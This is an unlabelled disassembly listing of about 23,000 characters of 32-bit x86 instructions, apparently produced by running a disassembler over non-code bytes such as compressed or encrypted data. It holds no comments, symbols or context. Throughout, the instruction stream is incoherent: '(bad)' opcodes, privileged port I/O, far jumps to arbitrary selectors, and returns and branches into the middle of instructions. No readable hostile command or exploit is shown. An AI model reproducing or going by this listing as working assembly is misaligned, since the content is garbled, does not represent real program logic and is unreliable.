  40327c:	mov    DWORD PTR [eax],ebp
  40327e:	scas   eax,DWORD PTR es:[edi]
  40327f:	inc    ebx
  403280:	inc    eax
  403281:	xor    al,0x22
  403283:	adc    edx,0x7bcd6d73
  403289:	mov    dh,BYTE PTR [ebx+0x66]
  40328c:	push   es
  40328d:	xor    ah,BYTE PTR [edx+0x15]
  403290:	jg     0x4032b1
  403292:	push   ecx
  403293:	ins    BYTE PTR es:[edi],dx
  403294:	jb     0x403226
  403296:	cdq    
  403297:	pop    ecx
  403298:	add    bl,BYTE PTR ds:0xbfde4742
  40329e:	cmc    
  40329f:	add    eax,0xa018c9d7
  4032a4:	jb     0x40325e
  4032a6:	cli    
  4032a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a8:	iret   
  4032a9:	sar    ebp,1
  4032ab:	adc    BYTE PTR [esi+0x6],ah
  4032ae:	leave  
  4032af:	sbb    cl,BYTE PTR [edi+0x2c]
  4032b2:	jge    0x40323d
  4032b4:	inc    eax
  4032b5:	and    ch,BYTE PTR [si]
  4032b8:	ds popa 
  4032ba:	or     DWORD PTR [ebx*1+0x7b157dcb],esi
  4032c1:	pop    ecx
  4032c2:	mov    esi,0x1acfd8
  4032c7:	bound  esp,QWORD PTR [ebx+ebx*1-0x46c90cef]
  4032ce:	pop    ebx
  4032cf:	add    al,0xa
  4032d1:	in     eax,dx
  4032d2:	xchg   edi,eax
  4032d3:	jl     0x40328b
  4032d5:	push   0x26eb32fd
  4032da:	inc    ebp
  4032db:	jl     0x403325
  4032dd:	push   ds
  4032de:	fcom   QWORD PTR [edi]
  4032e0:	stos   DWORD PTR es:[edi],eax
  4032e1:	adc    al,0x9c
  4032e3:	jecxz  0x403355
  4032e5:	aas    
  4032e6:	dec    ecx
  4032e7:	into   
  4032e8:	bound  ebx,QWORD PTR [ebp+0x10]
  4032eb:	push   ds
  4032ec:	pop    esi
  4032ed:	jb     0x4032b3
  4032ef:	or     bh,cl
  4032f1:	push   ecx
  4032f2:	jge    0x403313
  4032f4:	aas    
  4032f5:	stos   BYTE PTR es:[edi],al
  4032f6:	arpl   WORD PTR [edx],cx
  4032f8:	ficom  WORD PTR [ebx-0x88cba5f]
  4032fe:	mov    al,0x48
  403300:	dec    BYTE PTR ds:0x52bf5f50
  403306:	aam    0x56
  403308:	jle    0x4032a9
  40330a:	scas   al,BYTE PTR es:[edi]
  40330b:	fcmovb st,st(0)
  40330d:	push   0x9ef6bee6
  403312:	dec    eax
  403313:	cmp    DWORD PTR [esp+edi*2-0x1077b472],ebx
  40331a:	outs   dx,DWORD PTR ds:[esi]
  40331b:	push   ss
  40331c:	jmp    0x40335c
  40331e:	pop    edi
  40331f:	push   0xffffff96
  403321:	jmp    FWORD PTR [edx+ecx*1+0x3fe7ff3e]
  403328:	lods   al,BYTE PTR ds:[esi]
  403329:	and    dh,BYTE PTR [ebx+edi*2-0x19374895]
  403330:	jne    0x403335
  403332:	rcr    edi,cl
  403334:	jge    0x403333
  403336:	repz mov eax,ds:0x78986ff6
  40333c:	stos   BYTE PTR es:[edi],al
  40333d:	mov    ds:0xe0b2b26f,eax
  403342:	xor    DWORD PTR [eax],ebx
  403344:	in     al,dx
  403345:	leave  
  403346:	and    eax,0xf275a471
  40334b:	setb   BYTE PTR [eax+edi*4-0x48ae6f31]
  403353:	inc    eax
  403354:	je     0x403341
  403356:	push   edi
  403357:	fiadd  WORD PTR [edx-0x1a8ff4b9]
  40335d:	adc    bh,bh
  40335f:	test   edi,ebx
  403361:	(bad)  
  403362:	xchg   esi,eax
  403363:	sbb    ebx,esp
  403365:	sbb    dl,cl
  403367:	shl    BYTE PTR [ebx+edi*1-0x48],0xa0
  40336c:	mov    bl,0x3b
  40336e:	xchg   edx,edi
  403370:	xchg   edi,eax
  403371:	add    al,0xf6
  403373:	movq   mm5,mm2
  403376:	ret    
  403377:	fs ins BYTE PTR es:[edi],dx
  403379:	loop   0x4033f9
  40337b:	hlt    
  40337c:	out    0x4f,eax
  40337e:	in     al,dx
  40337f:	mov    edi,0xf05b125d
  403384:	inc    ebp
  403385:	mov    edi,0x567b77d7
  40338a:	add    al,0xeb
  40338c:	jmp    0x2063:0xdd3e6cc1
  403393:	es test al,0x81
  403396:	fcmovu st,st(4)
  403398:	push   eax
  403399:	repnz xor bh,BYTE PTR [ecx+0x45936ad3]
  4033a0:	inc    eax
  4033a1:	test   ch,cl
  4033a3:	adc    ebp,eax
  4033a5:	jl     0x4033e7
  4033a7:	add    al,0x3d
  4033a9:	mov    esi,0x5d2bd383
  4033ae:	in     al,dx
  4033af:	inc    edi
  4033b0:	dec    ecx
  4033b1:	sbb    DWORD PTR [ebp-0x13],ecx
  4033b4:	cwde   
  4033b5:	sbb    eax,0xfe51ac9f
  4033ba:	mov    bl,0x7c
  4033bc:	sub    DWORD PTR [ebp*1-0x3124fc06],eax
  4033c3:	xchg   edi,eax
  4033c4:	loopne 0x403375
  4033c6:	lea    ebx,[eax]
  4033c8:	mov    bh,BYTE PTR [ecx]
  4033ca:	adc    al,0xff
  4033cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033cd:	test   DWORD PTR [eax],ebp
  4033cf:	test   bh,0xec
  4033d2:	stos   DWORD PTR es:[edi],eax
  4033d3:	jmp    0xd390:0x7865
  4033d9:	jo     0x403438
  4033db:	ss xchg ecx,eax
  4033dd:	cld    
  4033de:	iret   
  4033df:	jl     0x40343d
  4033e1:	push   es
  4033e2:	enter  0xb480,0x8
  4033e6:	cmp    DWORD PTR [ecx+0x3b],eax
  4033e9:	(bad)  
  4033ea:	sar    BYTE PTR [ebx],0x40
  4033ed:	fldenv [ebp+0x50c46e92]
  4033f3:	in     al,0x4a
  4033f5:	mov    ecx,0x599eea12
  4033fa:	mov    bh,0x5b
  4033fc:	nop
  4033fd:	es sbb al,0xd3
  403400:	jmp    0x776b:0x50baabac
  403407:	shl    BYTE PTR [ebp+0x4f496782],cl
  40340d:	icebp  
  40340e:	pop    edx
  40340f:	or     bh,BYTE PTR [edi-0x6d56e893]
  403415:	inc    ebx
  403416:	clc    
  403417:	test   al,0xdc
  403419:	and    al,0x89
  40341b:	cmp    al,0xa8
  40341d:	dec    ebx
  40341e:	sbb    eax,0x5eb90907
  403423:	cmp    DWORD PTR [ebp+0x22],esi
  403426:	sub    eax,0xb291d8f2
  40342b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40342c:	mov    esp,0x5fb8ac62
  403431:	xchg   BYTE PTR [edx+0x3490675],ah
  403437:	out    0xc9,eax
  403439:	xchg   BYTE PTR [eax+0x632f0876],cl
  40343f:	inc    ebx
  403440:	inc    esp
  403441:	jmp    0x9de2b215
  403446:	pop    es
  403447:	sub    al,BYTE PTR [esi]
  403449:	dec    esp
  40344a:	iret   
  40344b:	inc    esp
  40344c:	pop    ss
  40344d:	jg     0x403421
  40344f:	jp     0x403434
  403451:	adc    al,0x5b
  403453:	mov    dh,BYTE PTR [edx-0x5d12732f]
  403459:	cmp    DWORD PTR [esi-0x7b],0x38
  40345d:	sbb    DWORD PTR [esi],esp
  40345f:	pop    ss
  403460:	mov    ecx,0x4fcf6a96
  403465:	nop
  403466:	stc    
  403467:	xlat   BYTE PTR ds:[bx]
  403469:	sub    al,0x11
  40346b:	push   es
  40346c:	lds    eax,FWORD PTR [ebp+0x4a803205]
  403472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403473:	addr16 pop edx
  403475:	lock (bad) 
  403477:	mov    esp,esi
  403479:	clc    
  40347a:	dec    DWORD PTR [ebx]
  40347c:	push   esp
  40347d:	les    ebp,FWORD PTR [edx-0x702c1cbf]
  403483:	and    al,0xeb
  403485:	jae    0x403498
  403487:	inc    eax
  403488:	adc    dh,ch
  40348a:	mov    bh,0x3a
  40348c:	xchg   ecx,eax
  40348d:	mov    dh,BYTE PTR [edx+0x1ced2990]
  403493:	in     eax,dx
  403494:	lods   eax,DWORD PTR ds:[esi]
  403495:	jmp    0x403457
  403497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403498:	sti    
  403499:	cmp    BYTE PTR [edx],cl
  40349b:	sub    BYTE PTR [ebp+0x280c32c5],al
  4034a1:	adc    DWORD PTR [ecx],edx
  4034a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034a4:	fcmovnbe st,st(7)
  4034a6:	test   DWORD PTR cs:[esi+0x2a43324f],edx
  4034ad:	and    DWORD PTR [edi-0x6d3b12b1],edx
  4034b3:	xchg   esi,eax
  4034b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b5:	mov    ds:0xd07f1c71,eax
  4034ba:	repz jmp 0x403516
  4034bd:	stos   DWORD PTR es:[edi],eax
  4034be:	enter  0xbb25,0x60
  4034c2:	sti    
  4034c3:	mov    ebp,0xf21f7f8
  4034c8:	call   0xf481:0x19848e64
  4034cf:	dec    ebp
  4034d0:	call   0x6f7e7d23
  4034d5:	sub    BYTE PTR [edi-0x4],ch
  4034d8:	call   0x85ac:0x9ed1ebe8
  4034df:	sub    ecx,0xa3e22f61
  4034e5:	mov    esp,0xe0e14672
  4034ea:	aad    0xde
  4034ec:	dec    eax
  4034ed:	in     al,0x54
  4034ef:	adc    al,0xe9
  4034f1:	ficom  DWORD PTR [ecx-0x6c34213e]
  4034f7:	lods   eax,DWORD PTR ds:[esi]
  4034f8:	retf   0x853f
  4034fb:	xchg   esi,eax
  4034fc:	dec    esp
  4034fd:	jle    0x403548
  4034ff:	or     bh,BYTE PTR [esp+eiz*8-0x3e4f83d2]
  403506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403507:	pop    edi
  403508:	scas   al,BYTE PTR es:[edi]
  403509:	out    0x1f,eax
  40350b:	xchg   edi,eax
  40350c:	add    bl,BYTE PTR [edx+0x7f767ca5]
  403512:	jbe    0x4034d0
  403514:	and    DWORD PTR [esp+edx*8+0x1d836a00],esp
  40351b:	pusha  
  40351c:	jle    0x403515
  40351e:	clc    
  40351f:	or     eax,0x19137714
  403524:	mov    dl,0x90
  403526:	adc    al,BYTE PTR [ebp-0x46]
  403529:	loopne 0x403514
  40352b:	push   edi
  40352c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40352d:	sbb    DWORD PTR [edi-0x76a678cf],esp
  403533:	push   ebx
  403534:	scas   eax,DWORD PTR es:[edi]
  403535:	inc    esp
  403536:	add    ecx,DWORD PTR [eax-0xea0034d]
  40353c:	and    bh,BYTE PTR [ebx]
  40353e:	jne    0x40359d
  403540:	jmp    0x50f5:0x181d45b4
  403547:	push   edi
  403548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403549:	cmp    bh,BYTE PTR [ecx+0x4e]
  40354c:	cmp    al,0x96
  40354e:	sub    al,0x46
  403550:	sub    BYTE PTR [ebp+0x621f2d5d],dh
  403556:	jo     0x40356b
  403558:	pop    ebp
  403559:	mov    ebx,DWORD PTR [ebx+ebp*2-0x52]
  40355d:	push   ss
  40355e:	or     bl,BYTE PTR [edi-0x7a]
  403561:	inc    ebx
  403562:	xchg   ebp,eax
  403563:	pop    ecx
  403564:	fisttp WORD PTR [edx-0x40]
  403567:	and    eax,DWORD PTR [edx-0x27]
  40356a:	mov    ch,0xeb
  40356c:	inc    ebx
  40356d:	and    dl,bl
  40356f:	lock jmp 0xba6d8878
  403575:	and    dl,BYTE PTR [edx+0x5e0614b1]
  40357b:	xsavec [edi]
  40357e:	test   edx,esp
  403580:	sbb    ecx,ebp
  403582:	jmp    0x4035f9
  403584:	cmc    
  403585:	int    0x3e
  403587:	fdivrp st(0),st
  403589:	dec    edx
  40358a:	add    eax,0x31c51480
  40358f:	adc    al,0x6e
  403591:	or     eax,0x2d18ba7d
  403596:	fild   DWORD PTR [esi]
  403598:	rcr    ebx,1
  40359a:	ficom  WORD PTR ds:0x3c18f43a
  4035a0:	retf   
  4035a1:	add    ebp,DWORD PTR [edx]
  4035a3:	jmp    0xc83c65b
  4035a8:	mov    edi,0x28214c83
  4035ad:	xchg   BYTE PTR [eax],al
  4035af:	(bad)  
  4035b0:	dec    edi
  4035b1:	stc    
  4035b2:	jne    0x4035fa
  4035b4:	mov    bh,BYTE PTR [esp+esi*8]
  4035b7:	(bad)  
  4035b8:	imul   esp,DWORD PTR [esp+esi*4-0x5],0x17
  4035bd:	(bad)  
  4035be:	push   ebp
  4035bf:	sub    bh,cl
  4035c1:	mov    ah,0xca
  4035c3:	pop    esp
  4035c4:	clc    
  4035c5:	(bad)  
  4035c6:	inc    ebx
  4035c7:	jp     0x403586
  4035c9:	(bad)  
  4035ca:	sub    DWORD PTR [ebx+0x2796068b],0x4d
  4035d1:	scas   eax,DWORD PTR es:[edi]
  4035d2:	push   ebp
  4035d3:	mov    al,BYTE PTR [ebx]
  4035d5:	das    
  4035d6:	int3   
  4035d7:	dec    ch
  4035d9:	inc    esi
  4035da:	out    0x3e,eax
  4035dc:	xchg   DWORD PTR [eax-0x7af5a1fc],esi
  4035e2:	std    
  4035e3:	pop    eax
  4035e4:	sbb    al,0x28
  4035e6:	ror    BYTE PTR [ecx],0xfb
  4035e9:	jno    0x40357d
  4035eb:	add    bh,al
  4035ed:	adc    DWORD PTR [edx],ecx
  4035ef:	mov    bl,0xd5
  4035f1:	popa   
  4035f2:	cmp    DWORD PTR [ebx],ecx
  4035f4:	sbb    ebx,DWORD PTR [esi+0x40]
  4035f7:	imul   ebp,esi,0xffffffd4
  4035fa:	mov    BYTE PTR [edx+0x658ea3a],bh
  403600:	cs mov ch,0xf3
  403603:	fbld   TBYTE PTR [ebx+0x71]
  403606:	repz rol BYTE PTR [ebp-0x50],1
  40360a:	inc    edi
  40360b:	mov    ds:0xb9cd2f4b,eax
  403610:	aad    0x7a
  403612:	xchg   ecx,eax
  403613:	pop    ebx
  403614:	and    DWORD PTR [eax+0x78],ebx
  403617:	lahf   
  403618:	sahf   
  403619:	add    BYTE PTR ds:0xb0fd31e,ch
  40361f:	outs   dx,BYTE PTR ds:[esi]
  403620:	(bad)  
  403621:	sub    ah,dh
  403623:	aad    0x5
  403625:	jmp    0x4035c3
  403627:	ins    DWORD PTR es:[edi],dx
  403628:	pop    es
  403629:	dec    esp
  40362a:	pop    es
  40362b:	cmp    ebx,DWORD PTR [edi]
  40362d:	cmp    bl,BYTE PTR [edx]
  40362f:	les    ebp,FWORD PTR [edi]
  403631:	inc    esi
  403632:	adc    cl,BYTE PTR [edx]
  403634:	dec    ecx
  403635:	and    BYTE PTR [ecx-0x43],bh
  403638:	inc    esi
  403639:	ja     0x40364c
  40363b:	adc    BYTE PTR [edx],ah
  40363d:	push   eax
  40363e:	xlat   BYTE PTR ds:[ebx]
  40363f:	mov    ch,0xf1
  403641:	je     0x403607
  403643:	xchg   edx,eax
  403644:	test   eax,0xd2198f64
  403649:	adc    eax,DWORD PTR [eax+edx*4-0xb]
  40364d:	mov    al,ds:0x5878ed82
  403652:	loop   0x40361c
  403654:	sub    BYTE PTR [edi-0x3ae9b6fb],cl
  40365a:	mov    ebx,0x941bd928
  40365f:	push   esi
  403660:	jmp    0x403648
  403662:	sub    cl,dl
  403664:	adc    al,dl
  403666:	dec    eax
  403667:	pop    esp
  403668:	sub    BYTE PTR [esi+0x6],al
  40366b:	adc    eax,0x111e34c4
  403670:	call   0x1443:0x71ef3ac3
  403677:	push   ss
  403678:	in     al,0x39
  40367a:	test   DWORD PTR [ebp-0x7699044b],edx
  403680:	std    
  403681:	aaa    
  403682:	mov    bl,0x26
  403684:	cmp    eax,0x69fd15e6
  403689:	cmp    dl,bl
  40368b:	(bad)  
  40368c:	fcomip st,st(5)
  40368e:	pop    ss
  40368f:	(bad)  [ebx+ebx*2+0x28]
  403693:	pop    ss
  403694:	push   0x68
  403696:	inc    edi
  403697:	dec    edx
  403698:	in     al,0xb9
  40369a:	sbb    bl,BYTE PTR [eax-0x6b]
  40369d:	pop    ebp
  40369e:	push   esp
  40369f:	jp     0x40362f
  4036a1:	xor    DWORD PTR [eax-0x73],0x20
  4036a5:	cmc    
  4036a6:	jns    0x403689
  4036a8:	sub    ah,ah
  4036aa:	dec    esi
  4036ab:	mov    BYTE PTR [ebp+0x32],dl
  4036ae:	or     DWORD PTR [edi-0x39],ebx
  4036b1:	into   
  4036b2:	sbb    BYTE PTR [edx+0x35fa5b2b],al
  4036b8:	push   esp
  4036b9:	cmp    eax,0xa2b8d91a
  4036be:	pop    ds
  4036bf:	sbb    esp,DWORD PTR [esi+eax*1-0x1d]
  4036c3:	jecxz  0x403741
  4036c5:	imul   edi,DWORD PTR [ecx+0x4145e21d],0xe68ffec9
  4036cf:	add    bl,BYTE PTR [edi-0x6a5df6b3]
  4036d5:	dec    eax
  4036d6:	pop    ds
  4036d7:	pop    edx
  4036d8:	xchg   ebx,eax
  4036d9:	rcl    DWORD PTR [edx],cl
  4036db:	popf   
  4036dc:	mov    edi,0x133dddcf
  4036e1:	or     al,0xe9
  4036e3:	stc    
  4036e4:	jle    0x4036ee
  4036e6:	es mov edi,0xebd344a6
  4036ec:	aad    0x1f
  4036ee:	lods   al,BYTE PTR ds:[esi]
  4036ef:	xchg   ebp,eax
  4036f0:	mov    dh,0xb
  4036f2:	pop    ebx
  4036f3:	inc    esp
  4036f4:	fistp  WORD PTR [edi+0x6552cb62]
  4036fa:	jno    0x403735
  4036fc:	fcomp  DWORD PTR [esi]
  4036fe:	icebp  
  4036ff:	test   eax,0x9e963c
  403704:	retf   0x58cd
  403707:	js     0x4036ce
  403709:	push   edx
  40370a:	mov    al,0xda
  40370c:	(bad)  
  40370d:	pop    ecx
  40370e:	fsub   QWORD PTR [edi+0x5d]
  403711:	jo     0x403752
  403713:	pop    esi
  403714:	mul    DWORD PTR [ebp+0x5d]
  403717:	mov    ds:0x728bee15,eax
  40371c:	cmc    
  40371d:	cdq    
  40371e:	int    0xc5
  403720:	les    edi,FWORD PTR [esi+ebp*2]
  403723:	cmp    edx,DWORD PTR [ecx+0x60be4417]
  403729:	jl     0x4036e8
  40372b:	test   BYTE PTR [esi-0x6b9d2f3],al
  403731:	dec    ebx
  403732:	cmp    DWORD PTR [eax-0x8],esp
  403735:	clc    
  403736:	sub    esi,DWORD PTR [ebx+0x1d5e0349]
  40373c:	cli    
  40373d:	int3   
  40373e:	adc    DWORD PTR [edx+0x48],eax
  403741:	outs   dx,DWORD PTR ds:[esi]
  403742:	(bad)  
  403743:	je     0x40374d
  403745:	call   0x2452:0xd26634ae
  40374c:	xchg   DWORD PTR [eax],eax
  40374e:	mov    WORD PTR [esp+esi*4],?
  403751:	inc    edi
  403752:	repz adc eax,0xdb7acd51
  403758:	(bad)  [esi-0x4c69f351]
  40375e:	cmc    
  40375f:	loop   0x40370d
  403761:	sti    
  403762:	cmc    
  403763:	pop    es
  403764:	repnz pop edx
  403766:	fbld   TBYTE PTR [edx]
  403768:	bound  ecx,QWORD PTR [ecx-0x23]
  40376b:	jle    0x403775
  40376d:	fadd   DWORD PTR [esi+0x7589bd9d]
  403773:	sbb    al,0xf6
  403775:	mov    ds:0x38b7ac61,eax
  40377a:	jns    0x403703
  40377c:	jb     0x4037f8
  40377e:	dec    ebp
  40377f:	inc    esi
  403780:	push   ds
  403781:	mov    ds:0x7a16c320,eax
  403786:	(bad)  
  403787:	ror    BYTE PTR [eax-0x4ca08b40],cl
  40378d:	inc    esi
  40378e:	into   
  40378f:	push   edx
  403790:	fisttp QWORD PTR ds:0x6cb90a52
  403796:	push   0xe
  403798:	int    0x37
  40379a:	mov    esp,DWORD PTR [ebp+0x3f3250c3]
  4037a0:	test   BYTE PTR [ebx],bh
  4037a2:	adc    esp,DWORD PTR [esi-0x3488a17]
  4037a8:	pop    ss
  4037a9:	hlt    
  4037aa:	mov    al,ds:0x6c5dd815
  4037af:	cmp    DWORD PTR [esi+0x6c],eax
  4037b2:	fisttp DWORD PTR [edx+edi*4]
  4037b5:	out    dx,eax
  4037b6:	ss xchg edx,eax
  4037b8:	add    edi,ebx
  4037ba:	adc    al,0x83
  4037bc:	pop    ss
  4037bd:	push   0x605c829
  4037c2:	ficomp WORD PTR [ebx-0x68a602e6]
  4037c8:	mov    ah,0x55
  4037ca:	scas   eax,DWORD PTR es:[edi]
  4037cb:	mov    bh,0xe5
  4037cd:	cdq    
  4037ce:	xchg   ebx,eax
  4037cf:	jp     0x40383d
  4037d1:	mov    esp,0xea13f90a
  4037d6:	outs   dx,DWORD PTR ds:[esi]
  4037d7:	dec    ecx
  4037d8:	(bad)  
  4037d9:	arpl   WORD PTR [eax],bp
  4037db:	scas   al,BYTE PTR es:[edi]
  4037dc:	cs call 0x6600:0xc8e24bf0
  4037e4:	mov    al,0x6d
  4037e6:	jb     0x40379f
  4037e8:	adc    eax,0x7b7e219b
  4037ed:	xor    ecx,DWORD PTR [edi-0x269bd877]
  4037f3:	cmp    esi,ecx
  4037f5:	iret   
  4037f6:	cdq    
  4037f7:	aad    0x2a
  4037f9:	out    dx,al
  4037fa:	xor    ebp,ecx
  4037fc:	cmc    
  4037fd:	jecxz  0x40382d
  4037ff:	and    DWORD PTR [eax-0x25],esp
  403802:	xor    DWORD PTR [eax+esi*2-0x25b54c17],edi
  403809:	pop    ecx
  40380a:	shr    DWORD PTR [ebx-0x7ee22655],1
  403810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403811:	jmp    0x4037e9
  403813:	and    al,BYTE PTR [edx]
  403815:	sub    BYTE PTR [ebp+0xa],bh
  403818:	iret   
  403819:	test   al,0xa4
  40381b:	mov    fs,ebp
  40381d:	dec    ebx
  40381e:	mov    ds:0x21d4b784,al
  403823:	aas    
  403824:	pushf  
  403825:	add    eax,0xeb5e012
  40382a:	nop
  40382b:	adc    esp,ebx
  40382d:	fdiv   QWORD PTR [ebp+0x2e]
  403830:	lods   al,BYTE PTR ds:[esi]
  403831:	icebp  
  403832:	mov    bl,0x62
  403834:	loop   0x4037b7
  403836:	jb     0x403870
  403838:	test   al,0x93
  40383a:	arpl   WORD PTR [ecx+0x70],sp
  40383d:	dec    esi
  40383e:	sbb    ebx,ebp
  403840:	repnz mov cs,WORD PTR [esi+0x76c496b8]
  403847:	dec    edx
  403848:	push   esi
  403849:	daa    
  40384a:	xchg   edx,eax
  40384b:	mov    bl,0xbe
  40384d:	and    eax,edx
  40384f:	push   0x68
  403851:	fs ds jns 0x4037d5
  403855:	adc    bh,ch
  403857:	sub    BYTE PTR [eax+0xcfb64fd],bl
  40385d:	add    DWORD PTR [esi+0x221f1a0b],eax
  403863:	(bad)  
  403864:	lock adc DWORD PTR [eax-0xdb3d4be],edx
  40386b:	mov    al,ds:0xcda4ecb2
  403870:	push   0x54
  403872:	cs xchg esi,eax
  403874:	sub    al,BYTE PTR [edx-0x394cd091]
  40387a:	push   ebx
  40387b:	cmc    
  40387c:	add    ah,cl
  40387e:	push   edi
  40387f:	ss xor al,0x3
  403882:	ja     0x4038bc
  403884:	sar    DWORD PTR [edx+0x3433d858],cl
  40388a:	cs scas eax,DWORD PTR es:[edi]
  40388c:	and    esi,edi
  40388e:	sub    ebp,DWORD PTR [ebx-0x9915a83]
  403894:	or     DWORD PTR [ebx],eax
  403896:	cmp    BYTE PTR [ecx-0x5],dh
  403899:	mov    bl,0x9b
  40389b:	sbb    eax,0xa8fe4bb5
  4038a0:	xor    bh,BYTE PTR [ecx+edi*1+0x2c74841f]
  4038a7:	cmp    esi,DWORD PTR [ebx+0x47]
  4038aa:	enter  0x2f17,0xea
  4038ae:	out    dx,al
  4038af:	sub    DWORD PTR [ebp-0x2c3733e1],ecx
  4038b5:	xchg   ebx,eax
  4038b6:	pop    ebp
  4038b7:	inc    edi
  4038b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038b9:	xchg   ebp,eax
  4038ba:	jmp    0x7ae0:0xd852bb23
  4038c1:	mov    esi,0xee0ebb47
  4038c6:	dec    ebx
  4038c7:	out    dx,al
  4038c8:	mov    ah,ch
  4038ca:	loope  0x4038b2
  4038cc:	int    0xb0
  4038ce:	les    edi,FWORD PTR [eax+0x6b]
  4038d1:	or     al,0x98
  4038d3:	mov    bh,BYTE PTR [esi+0xa1c02e1]
  4038d9:	cmp    eax,DWORD PTR [ecx-0xb64407b]
  4038df:	cld    
  4038e0:	pop    ds
  4038e1:	scas   eax,DWORD PTR es:[edi]
  4038e2:	mov    bl,0xb2
  4038e4:	xchg   edi,eax
  4038e5:	ret    
  4038e6:	outs   dx,BYTE PTR ds:[esi]
  4038e7:	jmp    0x7f9b:0xb6bc9ae1
  4038ee:	cmp    ah,BYTE PTR [ecx+0xd]
  4038f1:	test   eax,0x98103702
  4038f6:	shr    BYTE PTR [edx-0x25],1
  4038f9:	adc    BYTE PTR [ebx+0x52a9c572],0x23
  403900:	sbb    ah,BYTE PTR [esi-0x54df117a]
  403906:	jecxz  0x40393e
  403908:	xchg   esp,eax
  403909:	ja     0x4038f4
  40390b:	cmp    BYTE PTR [ebx],bh
  40390d:	enter  0xa0f,0x4d
  403911:	push   0x586c925b
  403916:	in     eax,0x5f
  403918:	push   eax
  403919:	mov    DWORD PTR [edx+esi*2],esi
  40391c:	sub    BYTE PTR ds:0xda7db042,bh
  403922:	rol    BYTE PTR [esi+0x1f6cd489],cl
  403928:	lods   al,BYTE PTR ds:[esi]
  403929:	fwait
  40392a:	loopne 0x403944
  40392c:	xor    eax,edi
  40392e:	xor    DWORD PTR [edi],edx
  403930:	dec    esp
  403931:	mov    esp,0x210ddffd
  403936:	in     al,dx
  403937:	outs   dx,BYTE PTR ds:[esi]
  403938:	xchg   BYTE PTR [edi-0xdf8e88d],bl
  40393e:	jmp    0x39ed08d9
  403943:	adc    esi,0x5052a274
  403949:	(bad)  
  40394a:	repz mov ah,BYTE PTR [edi]
  40394d:	jle    0x403974
  40394f:	into   
  403950:	test   edx,0x728dd2c
  403956:	test   eax,0xce1387c7
  40395b:	call   0xd843:0x9a1fc5fb
  403962:	pushf  
  403963:	fwait
  403964:	mov    ds,WORD PTR [esi+esi*4]
  403967:	xchg   al,cl
  403969:	fimul  DWORD PTR [eax+0x5e90a741]
  40396f:	add    eax,0xb1f92610
  403974:	jns    0x40394a
  403976:	hlt    
  403977:	sub    al,0x44
  403979:	fs (bad) 
  40397b:	nop
  40397c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40397d:	xchg   cl,ah
  40397f:	data16 mov cl,0x1c
  403982:	jnp    0x4039f3
  403984:	jg     0x40395b
  403986:	sbb    DWORD PTR [eax-0x2c],0x60
  40398a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40398b:	mov    WORD PTR [ecx-0x40],ds
  40398e:	rcl    ecx,1
  403990:	lods   al,BYTE PTR ds:[esi]
  403991:	push   0x528a3815
  403996:	add    eax,0x30af6a2e
  40399b:	add    BYTE PTR [edi+0x55],dl
  40399e:	pop    esp
  40399f:	jmp    0x40392b
  4039a1:	inc    edx
  4039a2:	dec    ebx
  4039a3:	setg   BYTE PTR [esi+0x17]
  4039a7:	mov    bl,0xeb
  4039a9:	or     edi,ebp
  4039ab:	dec    ebp
  4039ac:	mov    cl,0x21
  4039ae:	mov    eax,0xd059162f
  4039b3:	fld    QWORD PTR ds:0xbb62beed
  4039b9:	das    
  4039ba:	jmp    0xba9f:0xe32d2446
  4039c1:	dec    edx
  4039c2:	(bad)  
  4039c3:	adc    al,ch
  4039c5:	aad    0xb9
  4039c7:	popa   
  4039c8:	pop    ebp
  4039c9:	arpl   WORD PTR [ebx+0x6616eac8],bx
  4039cf:	xor    eax,0x1dba55b9
  4039d4:	xor    ebp,eax
  4039d6:	jae    0x403a09
  4039d8:	aaa    
  4039d9:	mov    ebp,0xf3950d42
  4039de:	pop    ss
  4039df:	xchg   ebx,eax
  4039e0:	and    dh,0xb8
  4039e3:	enter  0x1f78,0x5f
  4039e7:	jne    0x403992
  4039e9:	mov    DWORD PTR [ebp+0x430352d1],esi
  4039ef:	fimul  DWORD PTR [esi+0x72764ef9]
  4039f5:	xor    BYTE PTR [eax-0x56fb7ee6],ah
  4039fb:	stc    
  4039fc:	add    cl,BYTE PTR ds:0x53a6b5a9
  403a02:	ins    DWORD PTR es:[edi],dx
  403a03:	mov    bl,0x77
  403a05:	sub    esp,ebp
  403a07:	mov    edi,0x7b599058
  403a0c:	je     0x403a38
  403a0e:	sbb    BYTE PTR [edi+0x5bdcc7a4],dl
  403a14:	ror    DWORD PTR [edi-0x983bebb],1
  403a1a:	call   0x6480:0xddc0eced
  403a21:	mov    ah,al
  403a23:	daa    
  403a24:	add    DWORD PTR [edx],eax
  403a26:	cmc    
  403a27:	(bad)  
  403a28:	loopne 0x403a44
  403a2a:	jbe    0x403a98
  403a2c:	aam    0x4d
  403a2e:	stos   DWORD PTR es:[edi],eax
  403a2f:	push   ebx
  403a30:	mov    al,ds:0x89e316fb
  403a35:	mov    bh,0x2f
  403a37:	cs sub al,0x66
  403a3a:	cdq    
  403a3b:	aas    
  403a3c:	mov    bh,0xd2
  403a3e:	push   cs
  403a3f:	add    al,0xe
  403a41:	add    bh,BYTE PTR [edx]
  403a43:	lock xor DWORD PTR [ecx],esi
  403a46:	mov    esp,0x12f3e01
  403a4b:	hlt    
  403a4c:	aaa    
  403a4d:	cmp    al,0x27
  403a4f:	into   
  403a50:	mov    al,ds:0xd484ce4e
  403a55:	jne    0x403a12
  403a57:	xchg   ecx,esi
  403a59:	jo     0x403a6e
  403a5b:	retf   0x19d
  403a5e:	or     ebx,ebp
  403a60:	enter  0x4a20,0xe
  403a64:	stos   DWORD PTR es:[edi],eax
  403a65:	inc    eax
  403a66:	in     al,0x9
  403a68:	push   esi
  403a69:	cli    
  403a6a:	retf   0x17aa
